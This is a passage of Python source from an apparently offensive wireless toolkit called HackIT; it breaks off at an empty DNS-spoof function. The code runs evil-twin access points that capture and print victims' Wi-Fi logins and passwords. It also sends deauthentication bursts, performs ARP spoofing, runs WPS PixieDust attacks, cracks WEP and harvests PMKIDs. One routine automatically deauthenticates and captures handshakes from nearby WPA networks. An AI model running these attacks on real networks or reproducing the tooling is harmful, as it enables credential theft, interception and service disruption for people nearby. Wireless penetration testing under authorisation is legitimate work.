                                state["log"].append({
                                    "t": state["elapsed"], "kind": "login",
                                    "detail": f"{c.get('ssid','?')} / {c.get('username','-')} / {c.get('password','-')}",
                                })
                            last_cred_n = cred_n
                        lo.refresh()
                    except Exception:
                        pass
                    time.sleep(0.25)
        except KeyboardInterrupt:
            coord.stop()
            UI.print_warning("Evil twin stopped by operator.")
        elapsed = time.time() - started
        creds_final = coord.get_credentials()
        TH.summary_panel(
            [
                ("iface", iface),
                ("ssids", ", ".join(coord.ssids[:4])),
                ("beacons", f"{state['beacons']:,}"),
                ("deauths", f"{state['deauths']:,}"),
                ("clients", str(len(state["clients"]))),
                ("creds", str(len(creds_final))),
                ("elapsed", f"{elapsed:.1f}s"),
            ],
            title="EVIL TWIN STOPPED",
            accent="bright_magenta",
        )
        if creds_final:
            UI.print_success("Captured credentials:")
            for c in creds_final:
                UI.print_raw(f"   {c.get('ssid','?'):20} {c.get('username','-'):16} [green]{c.get('password','-')}[/green]")

    def do_eviltwin_multi(self, iface: str, base_ssid: str, num: int, channel: int,
                          captive: bool, bssid: Optional[str], dhcp_range: Optional[str], **kwargs):
        from . import themes as TH
        import random as _r
        import string as _str
        suffixes = ["_5G", "_2G", "_Guest", "_VPN", "_IoT", "_Mesh", "_EXT", "_Admin", "_Secure", "_Backup"]
        ssids = [base_ssid]
        for i in range(num):
            sfx = suffixes[i % len(suffixes)]
            tag = "".join(_r.choices(_str.digits, k=2))
            ssids.append(f"{base_ssid}{sfx}_{tag}")
        from hackit.wireless.eviltwin_coordinator import EviltwinCoordinator
        theme_name = kwargs.get("theme")
        rotate = float(kwargs.get("rotate") or 6.0)
        coord = EviltwinCoordinator(iface, ssids, channel, bssid)
        coord.set_captive(captive, dhcp_range)
        coord.start()
        state = {
            "iface": iface, "ssids": ssids, "clients": [], "creds": [],
            "beacons": 0, "deauths": 0, "elapsed": 0.0, "log": [],
        }
        started = time.time()
        last_cred_n = 0
        try:
            with TH.LiveOrchestra("eviltwin", state, theme=theme_name,
                                  rotate_every=rotate, refresh=10.0) as lo:
                while coord.is_alive():
                    try:
                        cs = coord.get_clients()
                        creds = coord.get_credentials()
                        cred_n = len(creds)
                        st = coord.status()

                        def _kv(k):
                            import re as _re
                            m = _re.search(k + r"=(\d+)", st)
                            return int(m.group(1)) if m else 0
                        state["clients"] = cs
                        state["creds"] = creds
                        state["beacons"] = _kv("beacon")
                        state["deauths"] = _kv("deauth")
                        state["elapsed"] = time.time() - started
                        if cred_n > last_cred_n:
                            for c in creds[last_cred_n:]:
                                state["log"].append({
                                    "t": state["elapsed"], "kind": "login",
                                    "detail": f"{c.get('ssid','?')} / {c.get('username','-')} / {c.get('password','-')}",
                                })
                            last_cred_n = cred_n
                        lo.refresh()
                    except Exception:
                        pass
                    time.sleep(0.25)
        except KeyboardInterrupt:
            coord.stop()
            UI.print_warning("Evil twin stopped by operator.")
        creds_final = coord.get_credentials()
        TH.summary_panel(
            [
                ("ssids broadcast", str(len(ssids))),
                ("beacons", f"{state['beacons']:,}"),
                ("deauths", f"{state['deauths']:,}"),
                ("clients", str(len(state["clients"]))),
                ("creds", str(len(creds_final))),
                ("elapsed", f"{time.time() - started:.1f}s"),
            ],
            title=f"EVIL TWIN ({len(ssids)} AP) STOPPED",
            accent="bright_magenta",
        )

    def do_rogue_ap(self, iface: str, ssid: Optional[str] = None, channel: int = 6, wpa2: bool = False, captive: bool = False, bssid: Optional[str] = None, dhcp_range: Optional[str] = None, **kwargs):
        UI.print_info(f"Starting rogue AP '{ssid}' on {iface} ch {channel}...")
        self.do_beacon_flood(iface, ssid, 500, channel)
        UI.print_info("Rogue AP beaconing active. Set up hostapd + dnsmasq for full functionality.")

    def do_arp_spoof(self, target: str, gateway: str, timeout: int = 0, interval: int = 2, full_duplex: bool = False, output: Optional[str] = None, **kwargs):
        UI.print_info(f"ARP spoof: {target} ↔ {gateway}")
        try:
            proc = self.bridge.rust_arp_spoof(target, gateway)
        except EngineBuildError as e:
            UI.print_error(str(e))
            return
        jid = self.jobs.start(f"arp-spoof-{target}", proc)
        UI.print_info(f"ARP spoof job {jid} running (Ctrl+C to stop)...")
        try:
            for line in proc.stdout:
                l = line.strip()
                if l:
                    _console.print(f"  {l}")
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()
            UI.print_warning("ARP spoof stopped.")

    def do_forward(self, state: str, persist: bool = False, **kwargs):
        enable = state.lower() in ("on", "enable", "1", "true")
        try:
            if os.name == "nt":
                val = "1" if enable else "0"
                subprocess.run(["reg", "add",
                    r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                    "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", val, "/f"], check=True)
            else:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("1\n" if enable else "0\n")
            UI.print_success(f"Forwarding {'ENABLED' if enable else 'DISABLED'}.")
        except Exception as e:
            UI.print_error(str(e))

    # ════════════════════════════════════════════════════════════
    # PHASE 6: WPS/WEP/PWKID
    # ════════════════════════════════════════════════════════════

    def do_wps_scan(self, iface: str, timeout: int = 30, output: Optional[str] = None, **kwargs):
        iface = iface or self._default_iface()
        if shutil.which("wash"):
            UI.print_info(f"WPS scan via wash on {iface}...")
            subprocess.run(["wash", "-i", iface])
            return
        try:
            proc = self.bridge.rust_wps_scan(iface)
            for line in proc.stdout:
                _console.print(f"  {line.strip()}")
            proc.wait()
        except EngineBuildError:
            UI.print_warning("wash not found and Rust engine missing.")
            UI.print_info("Install wash (apt install reaver) or build the Rust engine.")

    def do_wps_pixie(self, iface: str, bssid: str, pin: str = "", timeout: int = 120, **kwargs):
        iface = iface or self._default_iface()
        if not bssid:
            UI.print_error("Specify BSSID.")
            return
        if shutil.which("reaver"):
            cmd = ["reaver", "-i", iface, "-b", bssid, "-K", "-vv"]
            if pin:
                cmd.extend(["-p", pin])
            UI.print_info(f"reaver PixieDust attack on {bssid}...")
            subprocess.run(cmd)
        elif shutil.which("bully"):
            cmd = ["bully", "-b", bssid, "-d", iface, "-F", "-B", "-T"]
            if pin:
                cmd.extend(["-p", pin])
            UI.print_info(f"bully PixieDust attack on {bssid}...")
            subprocess.run(cmd)
        else:
            try:
                proc = self.bridge.rust_wps_pixie(iface, bssid, pin)
                for line in proc.stdout:
                    _console.print(f"  {line.strip()}")
                proc.wait()
            except EngineBuildError:
                UI.print_error("No WPS tools available. Install reaver or bully.")

    def do_wps_pin(self, bssid: str, all_pins: bool = False, **kwargs):
        if not bssid or len(bssid) < 17:
            UI.print_error("Invalid BSSID format (XX:XX:XX:XX:XX:XX)")
            return
        try:
            proc = self.bridge.go_wps_pin(bssid)
            for line in proc.stdout:
                l = line.strip()
                if l:
                    _console.print(f"  {l}")
            proc.wait()
        except EngineBuildError:
            UI.print_error("Go workers not built.")

    def do_wep_capture(self, iface: str, bssid: str, output: str = "wep.pcap", timeout: int = 120, ivs_only: bool = False, **kwargs):
        iface = iface or self._default_iface()
        if not bssid:
            UI.print_error("Specify BSSID.")
            return
        try:
            proc = self.bridge.rust_wep_capture(iface, bssid, output)
            for line in proc.stdout:
                _console.print(f"  {line.strip()}")
            proc.wait()
        except EngineBuildError:
            UI.print_warning("Rust engine missing. Using airodump-ng fallback.")
            subprocess.run(["airodump-ng", "-c", "--bssid", bssid, "-w", output.replace(".pcap", ""), iface])

    def do_wep_arp_replay(self, iface: str, bssid: str, count: int = 0, delay: int = 0, timeout: int = 0, **kwargs):
        iface = iface or self._default_iface()
        if not bssid:
            UI.print_error("Specify BSSID.")
            return
        if shutil.which("aireplay-ng"):
            UI.print_info(f"ARP replay on {bssid} via aireplay-ng...")
            subprocess.run(["aireplay-ng", "-3", "-b", bssid, iface])
        else:
            try:
                proc = self.bridge.rust_wep_arp_replay(iface, bssid)
                for line in proc.stdout:
                    _console.print(f"  {line.strip()}")
                proc.wait()
            except EngineBuildError:
                UI.print_error("No ARP replay tool available.")

    def do_wep_crack(self, capture: str, method: str = "ptw", output: Optional[str] = None, **kwargs):
        if not os.path.exists(capture):
            UI.print_error(f"File not found: {capture}")
            return
        if shutil.which("aircrack-ng"):
            subprocess.run(["aircrack-ng", capture])
        else:
            result = self.bridge.rust_wep_crack(capture)
            _console.print(result.stdout or result.stderr or "No output")

    def do_pmkid_capture(self, iface: str, bssid: str = "", timeout: int = 30,
                          output: str = "", **kwargs):
        """PMKID harvest with a live capture theme. Uses the native engine
        (Rust handshake path detects PMKID in EAPOL M1) — hcxdumptool fallback."""
        from . import themes as TH
        iface = iface or self._default_iface()
        if not iface:
            UI.print_error("No interface.")
            return
        output = output or "pmkid.pcap"
        theme_name = kwargs.get("theme")
        rotate = float(kwargs.get("rotate") or 8.0)
        TH.phase_banner("capture", f"PMKID harvest  iface={iface}  bssid={bssid or 'any'}  timeout={timeout}s")
        state = {
            "ssid": "?", "bssid": bssid or "any",
            "frames": 0, "eapols": 0, "pmkid": 0, "pps": 0.0,
            "elapsed": 0.0, "events": [], "status": "pmkid harvesting",
        }
        started = time.time()
        captured = 0
        pmkid_line = ""
        try:
            proc = None
            try:
                proc = self.bridge.rust_handshake(iface, bssid, output, timeout)
            except EngineBuildError:
                proc = None
            if proc is None and shutil.which("hcxdumptool"):
                proc = self.bridge._popen([
                    "hcxdumptool", "-i", iface, "-o", output,
                    "--enable_status=1", "--tot=1",
                ])
            if proc is None:
                UI.print_error("No PMKID engine available. Build the Rust engine or install hcxdumptool.")
                return
            with TH.LiveOrchestra("capture", state, theme=theme_name,
                                  rotate_every=rotate, refresh=10.0) as lo:
                while proc.poll() is None:
                    line = None
                    try:
                        if proc.stdout:
                            line = proc.stdout.readline()
                    except Exception:
                        line = None
                    t = time.time() - started
                    state["elapsed"] = t
                    if line:
                        txt = line.strip()
                        if txt:
                            if "pmkid" in txt.lower():
                                captured += 1
                                pmkid_line = txt
                                state["pmkid"] = captured
                                state["events"].append({"t": t, "kind": "PMKID", "detail": txt[:60]})
                            m = re.search(r"PMKID[:\s]+([0-9a-fA-F]{32})", txt)
                            if m:
                                state["events"].append({"t": t, "kind": "KEY", "detail": m.group(1)})
                    else:
                        time.sleep(0.05)
                    lo.refresh()
                try:
                    proc.wait(timeout=3)
                except Exception:
                    proc.terminate()
            TH.summary_panel(
                [
                    ("output", output),
                    ("PMKID hits", str(captured)),
                    ("elapsed", f"{time.time() - started:.1f}s"),
                ],
                title="PMKID CAPTURE COMPLETE",
                accent="bright_green" if captured else "bright_yellow",
            )
            if captured and pmkid_line:
                UI.print_success(pmkid_line)
        except KeyboardInterrupt:
            try:
                proc.terminate()
            except Exception:
                pass
            UI.print_warning("PMKID capture stopped by operator.")

    # ════════════════════════════════════════════════════════════
    # PHASE 7: Spectrum & Interface Control
    # ════════════════════════════════════════════════════════════

    def do_spectrum(self, iface: str, **kwargs):
        iface = iface or self._default_iface()
        try:
            proc = self.bridge.go_spectrum(iface)
            lines = []
            for line in proc.stdout:
                l = line.strip()
                if l:
                    lines.append(l)
            proc.wait()
            channels = []
            for l in lines:
                m = re.search(r'Ch\s*(\d+)\s*\|\s*(\d+ MHz)\s*\|\s*(\S+)\s*\|\s*RSSI:\s*(-?\d+)', l)
                if m:
                    channels.append({"number": int(m.group(1)), "frequency": m.group(2),
                                     "band": m.group(3), "rssi": int(m.group(4)),
                                     "ap_count": 0, "utilization": 0})
            if channels:
                _console.print(UI.render_spectrum(channels))
            else:
                for l in lines:
                    _console.print(f"  {l}")
        except EngineBuildError:
            self._spectrum_fallback(iface)

    def _spectrum_fallback(self, iface: str):
        UI.print_info(f"Wi-Fi scanning (fallback) on {iface}...")
        channels = []
        for ch in range(1, 14):
            try:
                subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)], capture_output=True, text=True)
                time.sleep(0.1)
                raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=3)
                ap_count = raw.count("BSS ")
                sigs = re.findall(r'signal:\s*(-?\d+)', raw)
                avg_sig = sum(int(s) for s in sigs) // len(sigs) if sigs else -100
                channels.append({"number": ch, "frequency": f"{2412 + (ch - 1) * 5}", "band": "2.4GHz",
                                 "rssi": avg_sig, "ap_count": ap_count, "utilization": ap_count / 20})
            except Exception:
                continue
        if channels:
            _console.print(UI.render_spectrum(channels))

    def do_dual_band(self, iface: str):
        iface = iface or self._default_iface()
        UI.print_info(f"Dual-band analysis on {iface}...")
        for band, chans in [("2.4 GHz", range(1, 14)), ("5 GHz", [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165])]:
            _console.print(f"\n[bold cyan]--- {band} ---[/bold cyan]")
            for ch in chans:
                try:
                    subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)], capture_output=True, text=True, timeout=1)
                    time.sleep(0.02)
                except Exception:
                    continue
            raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=10)
            bssids = set(re.findall(r'BSS ([0-9a-f:]{17})', raw))
            _console.print(f"  Found {len(bssids)} APs in {band}")

    # ════════════════════════════════════════════════════════════
    # PHASE 8: Automation
    # ════════════════════════════════════════════════════════════

    def do_auto_handshake(self, iface: str, timeout: int = 60, deauth: bool = False, output: Optional[str] = None, **kwargs):
        iface = iface or self._default_iface()
        UI.print_success("Auto Handshake Capture")
        UI.print_info("Step 1: Scanning for APs...")
        aps = self._scan_networks()
        if not aps:
            UI.print_warning("No APs found.")
            return
        UI.print_info(f"Step 2: Found {len(aps)} AP(s). Capturing handshakes...")
        for ap in aps[:5]:
            bssid = ap.get("bssid", "")
            ssid = ap.get("ssid", "")
            if not bssid or not ssid:
                continue
            crypto = ap.get("encrypt", ap.get("security", ""))
            if "WPA" not in crypto and "WPA2" not in crypto:
                continue
            UI.print_info(f"  → {ssid} ({bssid})")
            self.do_handshake_capture(iface, bssid, timeout=15)
            self._send_deauth_burst(iface, bssid, "FF:FF:FF:FF:FF:FF", 10)
            time.sleep(2)
        UI.print_success("Step 3: Handshake capture complete. Check 'sessions'.")

    def do_auto_audit(self, iface: str, timeout: int = 300, skip_wep: bool = False, skip_wps: bool = False, output: Optional[str] = None, **kwargs):
        iface = iface or self._default_iface()
        UI.print_info("=== Full Automated Wireless Audit ===")
        self.do_crawl(iface, full=True)
        self.do_wpa3_detect(iface)
        self.do_hidden_ssid(iface)
        self.do_auto_handshake(iface)
        self.do_sessions()
        UI.print_success("Automated audit complete.")

    def do_auto_crack(self, search_dir: str = "", rules: Optional[str] = None, use_hashcat: bool = False, thread: int = 4, **kwargs):
        if not search_dir:
            search_dir = str(BASE)
        pcaps = glob.glob(os.path.join(search_dir, "*.pcap")) + glob.glob(os.path.join(search_dir, "handshakes", "*.pcap"))
        if not pcaps:
            UI.print_warning(f"No PCAP files found in {search_dir}")
            wordlist_paths = ["/usr/share/wordlists/rockyou.txt", "/usr/share/wordlists/rockyou.txt.gz"]
            for wp in wordlist_paths:
                if os.path.exists(wp):
                    UI.print_info(f"Trying wordlist: {wp}")
                    break
            else:
                UI.print_warning("No wordlist found. Install rockyou.txt.")
                return
        for pcap in pcaps:
            UI.print_info(f"Processing {pcap}...")
            self.do_verify(pcap)

    def do_jobs(self, json_output: bool = False, **kwargs):
        jobs = self.jobs.list_jobs()
        if not jobs:
            UI.print_warning("No background jobs running.")
            return
        table = Table(title="[bold cyan]Background Jobs[/bold cyan]", border_style="cyan")
        table.add_column("ID", style="yellow")
        table.add_column("Name", style="white")
        table.add_column("Status", style="green")
        table.add_column("Started", style="dim")
        table.add_column("Running", style="cyan")
        for j in jobs:
            table.add_row(j["id"], j["name"], j["status"], j["started"][:19],
                          "[green]✓[/green]" if j["running"] else "[red]✗[/red]")
        _console.print(table)

    def do_stop_job(self, jid: str):
        if self.jobs.stop(jid):
            UI.print_success(f"Job {jid} stopped.")
        else:
            UI.print_error(f"Job {jid} not found.")

    def do_stop_all(self, force: bool = False, **kwargs):
        self.jobs.stop_all()
        UI.print_success("All jobs stopped.")

    # ════════════════════════════════════════════════════════════
    # PHASE 9: Session / Workspace Management
    # ════════════════════════════════════════════════════════════

    def do_session_list(self, json_output: bool = False, **kwargs):
        try:
            proc = self.bridge.go_session()
            for line in proc.stdout:
                l = line.strip()
                if l:
                    _console.print(f"  {l}")
            proc.wait()
        except EngineBuildError:
            self._session_list_fallback()

    def _session_list_fallback(self):
        session_file = BASE / "go_workers" / "sessions.json"
        if session_file.exists():
            try:
                data = json.loads(session_file.read_text())
                table = Table(title="[bold cyan]Sessions[/bold cyan]", border_style="cyan")
                table.add_column("ID", style="yellow")
                table.add_column("SSID", style="white")
                table.add_column("BSSID", style="cyan")
                table.add_column("Status", style="green")
                for s in data if isinstance(data, list) else data.get("sessions", []):
                    table.add_row(s.get("id", "?")[:8], s.get("ssid", "?"), s.get("bssid", "?"), s.get("status", "?"))
                _console.print(table)
            except Exception:
                pass

    def do_workspace_create(self, name: str, path: Optional[str] = None, **kwargs):
        ws = BASE / "workspaces" / name
        ws.mkdir(parents=True, exist_ok=True)
        captures = ws / "captures"
        handshakes = ws / "handshakes"
        reports = ws / "reports"
        captures.mkdir(exist_ok=True)
        handshakes.mkdir(exist_ok=True)
        reports.mkdir(exist_ok=True)
        config = ws / "config.json"
        config.write_text(json.dumps({
            "created": dt.datetime.now().isoformat(),
            "name": name,
            "targets": [],
            "notes": "",
        }, indent=2))
        UI.print_success(f"Workspace '{name}' created at {ws}")

    def do_workspace_load(self, name: str):
        ws = BASE / "workspaces" / name
        if ws.is_dir():
            UI.print_success(f"Loaded workspace '{name}'")
            return str(ws)
        UI.print_error(f"Workspace '{name}' not found.")
        return None

    def do_report_export(self, session: str, fmt: str = "md", output: Optional[str] = None, **kwargs):
        UI.print_info(f"Exporting report for session '{session}' in {fmt} format...")
        out = BASE / "reports" / f"report_{session}.{fmt}"
        out.parent.mkdir(exist_ok=True)
        report = f"""# HackIT Wireless Audit Report
**Session:** {session}
**Date:** {dt.datetime.now().isoformat()}

## Summary
- TODO: Fill with scan data

## Findings
- TODO: Document vulnerabilities

## Recommendations
- TODO: Add recommendations
"""
        out.write_text(report)
        UI.print_success(f"Report saved: {out}")

    # ════════════════════════════════════════════════════════════
    # INTERNAL HELPERS
    # ════════════════════════════════════════════════════════════

    def _detect_subnet(self) -> str:
        try:
            if os.name == "nt":
                out = subprocess.check_output("ipconfig", text=True)
                for line in out.splitlines():
                    if "IPv4" in line:
                        ip = line.split(":")[-1].strip()
                        parts = ip.split(".")
                        if len(parts) == 4:
                            return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
            else:
                out = subprocess.check_output(["hostname", "-I"], text=True)
                ip = out.split()[0]
                parts = ip.split(".")
                if len(parts) == 4:
                    return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
        except Exception:
            pass
        try:
            if os.name == "nt":
                out = subprocess.check_output("netstat -rn", shell=True, text=True)
                for line in out.splitlines():
                    if "0.0.0.0" in line and any(p in line for p in ("192", "10.", "172")):
                        parts = line.split()
                        gw = parts[2] if "." in parts[2] else parts[3]
                        octets = gw.split(".")
                        if len(octets) == 4:
                            return f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
        except Exception:
            pass
        return ""

    @staticmethod
    def _svc_name(port: int) -> str:
        SERVICES = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            3306: "MySQL", 3389: "RDP", 5900: "VNC", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
        }
        return SERVICES.get(port, f"Port-{port}")

    def _mode_switch(self, iface: str, mode: str, force: bool = False):
        import platform
        plat = platform.system().lower()
        is_root = os.geteuid() == 0 if plat != "windows" else True
        sudo = [] if is_root else ["sudo"]
        try:
            # ── Platform-specific mode switch ──
            if plat == "linux":
                self._mode_switch_linux(iface, mode, sudo, force)
            elif plat == "darwin":
                self._mode_switch_macos(iface, mode, sudo)
            elif plat == "windows":
                self._mode_switch_windows(iface, mode)
            else:
                UI.print_error(f"Unsupported platform: {plat}")
        except subprocess.CalledProcessError as e:
            UI.print_error(f"Mode switch failed: {e}")
            UI.print_info("Try: --no-check to skip verification, or run as root")
        except Exception as e:
            UI.print_error(f"Unexpected error: {e}")

    def _mode_switch_linux(self, iface, mode, sudo, force):
        if mode == "monitor":
            UI.print_info("Killing interfering processes...")
            subprocess.run(sudo + ["systemctl", "stop", "NetworkManager", "wpa_supplicant", "avahi-daemon"],
                           stderr=subprocess.DEVNULL)
            subprocess.run(sudo + ["airmon-ng", "check", "kill"],
                           stderr=subprocess.DEVNULL)

            if not force:
                try:
                    subprocess.run(sudo + ["airmon-ng", "start", iface],
                                   check=True, capture_output=True, timeout=15)
                    mon = f"{iface}mon"
                    r = subprocess.run(sudo + ["iw", mon, "info"],
                                       capture_output=True, text=True, timeout=5)
                    if r.returncode == 0:
                        UI.print_success(f"{iface} → monitor (via airmon-ng)")
                        UI.print_info(f"Using {mon} for capture")
                        return
                except (subprocess.CalledProcessError, FileNotFoundError):
                    pass

        subprocess.run(sudo + ["ip", "link", "set", iface, "down"], check=True, timeout=10)
        subprocess.run(sudo + ["iw", "dev", iface, "set", "type", mode], check=True, timeout=10)
        subprocess.run(sudo + ["ip", "link", "set", iface, "up"], check=True, timeout=10)

        if mode == "managed":
            subprocess.run(sudo + ["systemctl", "restart", "NetworkManager", "wpa_supplicant"],
                           stderr=subprocess.DEVNULL)

        r = subprocess.run(sudo + ["iw", "dev", iface, "info"],
                           capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if "type" in line and mode in line:
                    UI.print_success(f"{iface} → {mode}")
                    return
            UI.print_warning(f"{iface}: mode switch may not have taken effect")
        else:
            UI.print_warning("Could not verify mode (iw not available)")

    def _mode_switch_macos(self, iface, mode, sudo):
        if mode == "monitor":
            UI.print_info("Disassociating from current AP...")
            subprocess.run(sudo + ["/System/Library/PrivateFrameworks/Apple80211.framework/"
                                   "Versions/Current/Resources/airport", "-z"],
                           stderr=subprocess.DEVNULL)
            subprocess.run(sudo + ["ifconfig", iface, "down"], stderr=subprocess.DEVNULL)
            subprocess.run(sudo + ["ifconfig", iface, "up"], stderr=subprocess.DEVNULL)
            subprocess.Popen(sudo + ["/System/Library/PrivateFrameworks/Apple80211.framework/"
                                     "Versions/Current/Resources/airport", iface, "sniff", "1"],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            UI.print_success(f"{iface} → monitor (airport sniff)")
        else:
            subprocess.run(["pkill", "-f", "airport.*sniff"], stderr=subprocess.DEVNULL)
            subprocess.run(sudo + ["networksetup", "-setairportpower", iface, "on"],
                           stderr=subprocess.DEVNULL)
            subprocess.run(sudo + ["ifconfig", iface, "up"], stderr=subprocess.DEVNULL)
            UI.print_success(f"{iface} → managed")

    def _mode_switch_windows(self, iface, mode):
        if mode == "monitor":
            UI.print_info("Enabling promiscuous mode...")
            subprocess.run(["netsh", "interface", "set", "interface", f"name={iface}", "admin=disabled"],
                           stderr=subprocess.DEVNULL)
            time.sleep(0.3)
            subprocess.run(["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\NDIS\Parameters",
                           "/v", "AllowMonitorMode", "/t", "REG_DWORD", "/d", "1", "/f"],
                           stderr=subprocess.DEVNULL)
            subprocess.run(["netsh", "interface", "set", "interface", f"name={iface}", "admin=enabled"],
                           stderr=subprocess.DEVNULL)
            time.sleep(0.3)
            subprocess.run(["netsh", "wlan", "set", "autoconfig", "enabled=no", f"interface={iface}"],
                           stderr=subprocess.DEVNULL)
            UI.print_success(f"{iface} → promiscuous mode")
        else:
            subprocess.run(["netsh", "wlan", "set", "autoconfig", "enabled=yes", f"interface={iface}"],
                           stderr=subprocess.DEVNULL)
            subprocess.run(["netsh", "wlan", "set", "allowexplicitcreds", "enabled"],
                           stderr=subprocess.DEVNULL)
            subprocess.run(["netsh", "interface", "set", "interface", f"name={iface}", "admin=enabled"],
                           stderr=subprocess.DEVNULL)
            UI.print_success(f"{iface} → managed")

    # ── Session management ───────────────────────────────────────

    def do_session_delete(self, session_id: str, **kwargs):
        session_file = BASE / "go_workers" / "sessions.json"
        if not session_file.exists():
            UI.print_error("No sessions file found.")
            return
        try:
            data = json.loads(session_file.read_text())
            sessions = data if isinstance(data, list) else data.get("sessions", [])
            new_sessions = [s for s in sessions if s.get("id") != session_id]
            if len(new_sessions) == len(sessions):
                UI.print_error(f"Session '{session_id}' not found.")
                return
            if isinstance(data, list):
                session_file.write_text(json.dumps(new_sessions, indent=2))
            else:
                data["sessions"] = new_sessions
                session_file.write_text(json.dumps(data, indent=2))
            UI.print_success(f"Session '{session_id}' deleted.")
        except Exception as e:
            UI.print_error(f"Delete failed: {e}")

    def do_session_info(self, session_id: str, **kwargs):
        session_file = BASE / "go_workers" / "sessions.json"
        if not session_file.exists():
            UI.print_error("No sessions file found.")
            return
        try:
            data = json.loads(session_file.read_text())
            sessions = data if isinstance(data, list) else data.get("sessions", [])
            for s in sessions:
                if s.get("id") == session_id:
                    table = Table(title=f"Session {session_id}", border_style="cyan")
                    table.add_column("Key", style="yellow")
                    table.add_column("Value", style="white")
                    for k, v in s.items():
                        table.add_row(k, str(v))
                    _console.print(table)
                    return
            UI.print_error(f"Session '{session_id}' not found.")
        except Exception as e:
            UI.print_error(f"Info failed: {e}")

    # ── Report management ────────────────────────────────────────

    def do_report_list(self, **kwargs):
        reports_dir = BASE / "reports"
        if not reports_dir.is_dir():
            UI.print_info("No reports directory found.")
            return
        files = sorted(reports_dir.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True)
        if not files:
            UI.print_info("No reports generated yet.")
            return
        table = Table(title="Reports", border_style="cyan")
        table.add_column("Name", style="yellow")
        table.add_column("Size", style="white")
        table.add_column("Modified", style="green")
        for f in files[:20]:
            mod = dt.datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
            table.add_row(f.name, f"{f.stat().st_size}B", mod)
        _console.print(table)

    # ── Workspace management ─────────────────────────────────────

    def do_workspace_list(self, **kwargs):
        ws_dir = BASE / "workspaces"
        if not ws_dir.is_dir():
            UI.print_info("No workspaces found.")
            return
        dirs = sorted(ws_dir.iterdir()) if ws_dir.exists() else []
        if not dirs:
            UI.print_info("No workspaces found.")
            return
        table = Table(title="Workspaces", border_style="cyan")
        table.add_column("Name", style="yellow")
        table.add_column("Path", style="white")
        table.add_column("Created", style="green")
        for d in dirs:
            if d.is_dir():
                cfg = d / "config.json"
                created = "?"
                if cfg.exists():
                    try:
                        created = json.loads(cfg.read_text()).get("created", "?")
                    except Exception:
                        pass
                table.add_row(d.name, str(d), created)
        _console.print(table)

    def do_workspace_delete(self, name: str, **kwargs):
        ws = BASE / "workspaces" / name
        if not ws.is_dir():
            UI.print_error(f"Workspace '{name}' not found.")
            return
        shutil.rmtree(ws)
        UI.print_success(f"Workspace '{name}' deleted.")

    # ── Job management ───────────────────────────────────────────

    def do_job_purge(self, **kwargs):
        self.jobs.stop_all()
        with self.jobs._lock:
            self.jobs._jobs.clear()
            self.jobs._counter = 0
        UI.print_success("All jobs purged.")

    # ── ARP table ────────────────────────────────────────────────

    def do_arp_table(self, **kwargs):
        table = Table(title="ARP Table", border_style="cyan")
        table.add_column("IP", style="yellow")
        table.add_column("HW Type", style="white")
        table.add_column("Flags", style="green")
        table.add_column("MAC", style="cyan")
        table.add_column("Mask", style="white")
        table.add_column("Device", style="magenta")
        try:
            if os.name == "nt":
                out = subprocess.check_output("arp -a", shell=True, text=True)
                for line in out.splitlines():
                    parts = line.split()
                    if len(parts) >= 3 and parts[0].count(".") == 3:
                        table.add_row(parts[0], "ether", "C", parts[1], "*", parts[2])
            else:
                with open("/proc/net/arp") as f:
                    for i, line in enumerate(f):
                        if i == 0:
                            continue
                        parts = line.split()
                        if len(parts) >= 6:
                            table.add_row(parts[0], parts[1], parts[2], parts[3], parts[4], parts[5])
            _console.print(table)
        except Exception as e:
            UI.print_error(f"ARP table failed: {e}")

    # ── DNS operations ───────────────────────────────────────────

    def do_dns_sniff(self, iface: str = "", **kwargs):
        timeout = kwargs.get("timeout", 30)
        output = kwargs.get("output", "")
        iface = iface or self._default_iface()
        if not iface:
            UI.print_error("No interface specified.")
            return
        try:
            cmd = ["sudo", "tcpdump", "-i", iface, "-n", "port", "53", "-X"]
            if output:
                cmd.extend(["-w", output])
            UI.print_info(f"Sniffing DNS on {iface} for {timeout}s...")
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            try:
                stdout, stderr = proc.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout, stderr = proc.communicate()
            if stdout:
                for line in stdout.splitlines()[-30:]:
                    print(f"  {line}")
            if stderr and "error" in stderr.lower():
                UI.print_warning(stderr[:200])
        except FileNotFoundError:
            UI.print_error("tcpdump not found. Install with: apt install tcpdump")

    def do_dns_resolve(self, host: str, **kwargs):
        try:
            import socket
            result = socket.getaddrinfo(host, None)
            table = Table(title=f"DNS Resolution: {host}", border_style="cyan")
            table.add_column("Family", style="yellow")
            table.add_column("Type", style="white")
            table.add_column("Protocol", style="green")
            table.add_column("Address", style="cyan")
            seen = set()
            for res in result:
                family = "IPv6" if res[0] == socket.AF_INET6 else "IPv4"
                addr = res[4][0]
                if addr not in seen:
                    seen.add(addr)
                    table.add_row(family, str(res[1]), str(res[2]), addr)
            _console.print(table)
        except socket.gaierror:
            UI.print_error(f"Cannot resolve: {host}")
        except Exception as e:
            UI.print_error(f"DNS resolve failed: {e}")

    def do_dns_spoof(self, target: str, spoof_ip: str, **kwargs):
